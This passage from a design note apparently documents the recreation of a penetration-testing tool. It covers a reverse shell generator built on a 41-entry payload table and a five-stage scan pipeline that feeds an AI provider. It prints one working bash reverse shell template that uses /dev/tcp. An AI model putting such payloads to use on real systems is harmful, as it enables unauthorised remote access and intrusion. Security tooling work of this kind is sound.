reference's own labels: `English(en)`, `日本語(jp)`, `한국어(kr)`,
`Русский язык(ru)`, `中文(zh)`, `Français(fr)`, `Deutsch(de)`, `العربية(ar)`,
`中文繁體(zh)`, `Español(es)`, `Português(pt)`.

## 8D. The reverse shell generator

Local template logic, not a service call. The reference's table has 41
entries; each carries a name, a description, the target operating system
(`Linux`, `Windows`, `Mac`), the listener type (`Reverse`, `Bind`,
`MSFVenom`, `HoaxShell`), the shell and a payload expression such as:

```js
payload: (ip, port) => "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
```

The expressions were converted to templates (`{0}` for the address, `{1}` for
the port) and written to `src/data/reverse-shells.json` together with the
reference's defaults. The generator computes the payload from the current
address and port, so it responds to input rather than replaying a string.

## 8E. The scan pipeline

The reference's `create-process` dialog runs five stages against the target:

1. **Initialization Scan** — the target's basic information
2. **Asset Analysis** — the target's associated assets
3. **Logical Interface Acquisition** — the target's web APIs and business logic
4. **Initial Risk Screening** — a pre-screen of the discovered interfaces
5. **Create Task List** — the test plan

The recreation runs the same five stages with the tools it already has: the
bundled crawler for stages 2 and 3, the bundled xray scanner for stage 4 and
the configured provider for stage 5, whose reply is parsed into the same
`test_lists` row the reference writes.
